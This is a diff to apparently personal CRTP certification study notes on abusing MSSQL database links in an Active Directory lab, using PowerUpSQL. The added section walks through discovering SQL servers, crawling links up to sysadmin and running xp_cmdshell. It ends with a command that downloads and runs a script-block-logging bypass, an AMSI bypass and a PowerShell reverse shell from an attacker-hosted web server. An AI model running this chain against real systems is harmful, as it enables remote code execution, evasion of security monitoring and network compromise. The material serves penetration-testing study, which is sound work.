@@ -2568,24 +2568,88 @@ dir \\dcorp-dc\C$
 ### ADCS - ESC6
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/bbdbb2bb-2506-4ad5-99a4-97da380a991f)
 
-# MSSQL Impersonate
-### Discovery (SPN Scanning)
-```
-Get-SQLInstanceDomain
-```
-### Check Accessibility
-```
-Get-SQLConnectionTestThreaded
-Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
-```
-### Gather Information
-```
-Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
-```
+
+# Trust Abuse - MSSQL Links
 ### Load PowerUpSQL
 ```
 Import-Module .\PowerUpSQL-master\PowerUpSQL.ps1
 ```
+### Discovery SQL Servers (SPN Scanning)
+```
+Get-SQLInstanceDomain -Verbose
+```
+### Check Accessibility (if you have the privilege to connect to the MSSQL server)
+```
+Get-SQLConnectionTestThreaded
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/ea3ccbd1-dac0-464c-860e-2d75a9afc2cf)
+### Gather Information
+```
+Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/a72f46b1-dfee-44c1-bf56-8b97ff3125cf)
+### Databases link
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/cc3d21f8-7af8-45a9-9eee-2893e57c40b7)
+
+you as an attacker if you have public access to `"DB - A"` and you would have dbuser user access on `"DB - B"` and you would have sa user access on `"DB - C"`
+### Search database Links
+```
+Get-SQLServerLink -Instance dcorp-mssql -Verbose
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/a188fcb8-cc46-42c2-b7da-6c6c8c00d9ca)
+
+`"DatabaseLinkID"` is 0 means the current DB.
+
+if you check the second part we will see the `"DatabaseLinkID"` is 1 means there is a link. there is a link between dcorp-mssql and DCORP-SQL1
+
+check `"is_data_Access_enabled"` if the value is true you can run a query to retrieve more links
+```
+select * from openquery("dcorp-sql1",'select * from master..sysservers')
+```
+### Another way to check the DBs links using GUI tool `heidisql`
+
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/f60c1e4f-c618-4600-8c7f-3139c292f56e)
+
+click on query and run the following command
+```
+select * from master..sysservers
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/53e49bb0-c98a-4d3d-8a59-cf12aaa735a4)
+
+### the best way to check the DBs links using LinkCrawl tool. it will dig down until reach the last link
+```
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/4aa3c4c0-71ce-4bdb-9355-91ead8065098)
+
+### when you reach the sysadmin you need to try to run command there
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/5f3b9a1e-d2fb-476c-8875-c8bc6e19aa5c)
+
+1. run a query in all DBs
+```
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xpcmdshell 'cmd /c set username'"
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/46126c7f-b5a6-44b1-b6db-6599a7ad240e)
+
+2. we need to know where it is going to be executed (mostly in the admin database)
+
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/59233ef1-fb3c-478e-a854-742d9ca8e046)
+
+3. you need to check the `CustomQuery`
+4. get a reverse shell. start a listener
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/c93ef71c-abc4-41a4-b5a0-41e6fb21bf7c)
+
+5. make sure that your local web server is running `hfs` then run the following command
+   
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/7661cc36-caef-40dd-b84b-ec427b6c4e10)
+```
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xpcmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt); iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql1
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/2588853c-46a4-49be-ab13-801402d5f593)
+
+
+# MSSQL Impersonate
 ### Check if the current user has access to the MSSQL service on another computer
 ```
 Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
@@ -2595,7 +2659,6 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 as we can see our user `"pastudent131"` has access to MSSQL service on a different computer `"UFC-SQLDev.us.funcorp.local"`
 
 But the problem is that our private user does not have SysAdmin privileges, so we cannot execute commands on the system that runs MSSQL Service in order to get Reverse Shell.
-
 ### Now we will see which users we can try to impersonate
 ```
 Get-SQLServerLinkCrawl -Instance <INSTANCE> -Verbose -Query 'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE'''
